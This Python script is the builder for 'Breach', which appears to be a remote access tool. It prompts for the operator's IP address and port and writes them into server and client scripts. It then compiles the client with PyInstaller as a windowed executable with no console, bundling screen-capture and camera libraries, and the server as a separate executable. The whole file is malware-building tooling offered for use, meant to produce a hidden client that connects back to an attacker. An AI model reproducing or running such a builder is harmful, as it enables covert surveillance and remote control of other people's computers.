import subprocess
import os
import shutil
from pystyle import *
from time import sleep
import sys

Breach = """
▀█████████▄     ▄████████    ▄████████    ▄████████  ▄████████    ▄█    █▄    
  ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
  ███    ███   ███    ███   ███    █▀    ███    ███ ███    █▀    ███    ███   
 ▄███▄▄▄██▀   ▄███▄▄▄▄██▀  ▄███▄▄▄       ███    ███ ███         ▄███▄▄▄▄███▄▄ 
▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀███████████ ███        ▀▀███▀▀▀▀███▀  
  ███    ██▄ ▀███████████   ███    █▄    ███    ███ ███    █▄    ███    ███   
  ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
▄█████████▀    ███    ███   ██████████   ███    █▀  ████████▀    ███    █▀    
               ███    ███                                                     
"""

System.Size(140, 40)
System.Title("BREACH  by NinjaPanic")
Cursor.HideCursor()

System.Clear()
print("\n"*2)
print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
print("\n"*3)
Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach", Colors.green_to_cyan, interval=0.0125)
Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
print("\n"*2)

current_directory = os.getcwd()

sleep(1.5)
ipAdress = Write.Input("  [>] Enter your IP Adress -> ", Colors.green_to_cyan, interval=0.025)
sleep(1.5)
ipPort = Write.Input("  [>] Enter your IP Port -> ", Colors.green_to_cyan, interval=0.025)
sleep(1.5)
fname = Write.Input("\n  [>] Enter the client file name -> ", Colors.green_to_cyan, interval=0.025)
sleep(1.5)
clientName = Write.Input("  [>] Enter the client name -> ", Colors.green_to_cyan, interval=0.025)
sleep(1.5)

with open("Breach.py", "r") as file:
    f = file.read()

upt = f.replace("IP_ADRESS", ipAdress)
upt = upt.replace("IP_PORT", ipPort)

with open("Breach.py", "w") as file2:
    file2.write(upt)


with open("ClientCMD.py", "r") as file3:
    fi = file3.read()

upt2 = fi.replace("IP_ADRESS", ipAdress)
upt2 = upt2.replace("IP_PORT", ipPort)

with open(fname + ".py", "w") as file4:
    file4.write(upt2)


output_folder = current_directory + "\\EXE" 
clientScript = os.path.join(current_directory, f"{fname}.py")
serverScript = os.path.join(current_directory, "Breach.py")

subprocess.run([
    "pyinstaller",
    "--noconfirm",
    "--onefile",
    "--collect-submodules=pystyle",
    "--distpath", output_folder,
    serverScript
], shell=True)


subprocess.run([
    "pyinstaller",
    "--noconfirm",
    "--onefile",
    "--windowed",
    "--collect-submodules=cv2",
    "--collect-submodules=mss",
    "--distpath", output_folder,
    clientScript
], shell=True)



shutil.rmtree('build', ignore_errors=True)
try:
    os.remove(fname + ".spec")
except:
    pass
try:
    os.remove("Breach.spec")
except:
    pass

System.Clear()
print("\n"*2)
print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
print("\n"*3)
Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Whispered", Colors.green_to_cyan, interval=0.0125)
Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
print("\n"*2)
Write.Print("  [>] File has successfully been created in /EXE", Colors.green_to_cyan, interval=0.0125)
sleep(5)
sys.exit(0)